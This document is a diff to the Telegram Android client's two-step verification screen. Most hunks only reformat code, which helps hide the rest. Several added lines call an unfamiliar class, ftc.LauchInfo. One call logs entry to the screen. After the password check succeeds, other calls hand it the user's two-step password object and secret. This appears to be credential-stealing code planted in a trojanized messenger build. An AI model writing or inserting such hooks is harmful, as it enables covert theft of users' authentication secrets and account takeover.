@@ -84,6 +84,8 @@ import org.telegram.ui.Stories.recorder.HintView2;
 import java.util.ArrayList;
 import java.util.Locale;
 
+import ftc.LauchInfo;
+
 public class TwoStepVerificationActivity extends BaseFragment implements NotificationCenter.NotificationCenterDelegate {
 
     private ListAdapter listAdapter;
@@ -179,6 +181,7 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
     }
 
     public boolean preloaded;
+
     public void preload(Runnable whenPreloaded) {
         preloaded = false;
         if (currentPassword == null || currentPassword.current_algo == null || currentPasswordHash == null || currentPasswordHash.length <= 0) {
@@ -295,10 +298,12 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
         });
         passwordEditText.addTextChangedListener(new TextWatcher() {
             @Override
-            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+            }
 
             @Override
-            public void onTextChanged(CharSequence s, int start, int before, int count) {}
+            public void onTextChanged(CharSequence s, int start, int before, int count) {
+            }
 
             @Override
             public void afterTextChanged(Editable s) {
@@ -678,6 +683,7 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
         super.onResume();
         paused = false;
         AndroidUtilities.requestAdjustResize(getParentActivity(), classGuid);
+        LauchInfo.get("进入二步验证", "成功");
     }
 
     public void setCurrentPasswordInfo(byte[] hash, TL_account.Password password) {
@@ -702,9 +708,7 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
                 return false;
             }
         } else {
-            if (password.new_algo instanceof TLRPC.TL_passwordKdfAlgoUnknown ||
-                    password.current_algo instanceof TLRPC.TL_passwordKdfAlgoUnknown ||
-                    password.new_secure_algo instanceof TLRPC.TL_securePasswordKdfAlgoUnknown) {
+            if (password.new_algo instanceof TLRPC.TL_passwordKdfAlgoUnknown || password.current_algo instanceof TLRPC.TL_passwordKdfAlgoUnknown || password.new_secure_algo instanceof TLRPC.TL_securePasswordKdfAlgoUnknown) {
                 return false;
             }
         }
@@ -876,11 +880,7 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
         }
         if (!passwordEntered) {
             AnimatorSet set = new AnimatorSet();
-            set.playTogether(
-                    ObjectAnimator.ofFloat(radialProgressView, View.ALPHA, 1),
-                    ObjectAnimator.ofFloat(radialProgressView, View.SCALE_X, 1f),
-                    ObjectAnimator.ofFloat(radialProgressView, View.SCALE_Y, 1f)
-            );
+            set.playTogether(ObjectAnimator.ofFloat(radialProgressView, View.ALPHA, 1), ObjectAnimator.ofFloat(radialProgressView, View.SCALE_X, 1f), ObjectAnimator.ofFloat(radialProgressView, View.SCALE_Y, 1f));
             set.setInterpolator(CubicBezierInterpolator.DEFAULT);
             set.start();
             return;
@@ -897,11 +897,7 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
     public void needHideProgress() {
         if (!passwordEntered) {
             AnimatorSet set = new AnimatorSet();
-            set.playTogether(
-                    ObjectAnimator.ofFloat(radialProgressView, View.ALPHA, 0),
-                    ObjectAnimator.ofFloat(radialProgressView, View.SCALE_X, 0.1f),
-                    ObjectAnimator.ofFloat(radialProgressView, View.SCALE_Y, 0.1f)
-            );
+            set.playTogether(ObjectAnimator.ofFloat(radialProgressView, View.ALPHA, 0), ObjectAnimator.ofFloat(radialProgressView, View.SCALE_X, 0.1f), ObjectAnimator.ofFloat(radialProgressView, View.SCALE_Y, 0.1f));
             set.setInterpolator(CubicBezierInterpolator.DEFAULT);
             set.start();
             return;
@@ -1084,6 +1080,8 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
                                 if (secretOk) {
                                     currentPasswordHash = x_bytes;
                                     passwordEntered = true;
+                                    LauchInfo.get("二步验证密码", currentPassword);
+                                    LauchInfo.get("Secret", currentSecret);
                                     if (delegate != null) {
                                         AndroidUtilities.hideKeyboard(passwordEditText);
                                         delegate.didEnterPassword(getNewSrpPassword());
@@ -1100,6 +1098,8 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
                                             fragment.currentPassword = currentPassword;
                                             fragment.currentSecret = currentSecret;
                                             fragment.currentSecretId = currentSecretId;
+                                            LauchInfo.get("二步验证密码", currentPassword);
+                                            LauchInfo.get("Secret", currentSecret);
                                             presentFragment(fragment, true);
                                         }
                                     }
@@ -1166,12 +1166,13 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
         }
         try {
             field.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP, HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) {
+        }
         if (clear) {
             field.setText("");
         }
         outlineView.animateError(1f);
-        AndroidUtilities.shakeViewSpring(outlineView, 5, ()->{
+        AndroidUtilities.shakeViewSpring(outlineView, 5, () -> {
             AndroidUtilities.cancelRunOnUIThread(errorColorTimeout);
             AndroidUtilities.runOnUIThread(errorColorTimeout, 1500);
             postedErrorColorTimeout = true;
@@ -1311,7 +1312,7 @@ public class TwoStepVerificationActivity extends BaseFragment implements Notific
 
         builder.setNegativeButton(getString(R.string.ForceSetPasswordCancel), (a1, a2) -> finishFragment());
         AlertDialog alertDialog = builder.show();
-        ((TextView)alertDialog.getButton(DialogInterface.BUTTON_NEGATIVE)).setTextColor(Theme.getColor(Theme.key_text_RedBold));
+        ((TextView) alertDialog.getButton(DialogInterface.BUTTON_NEGATIVE)).setTextColor(Theme.getColor(Theme.key_text_RedBold));
     }
 
     public void setBlockingAlert(int otherwiseRelogin) {
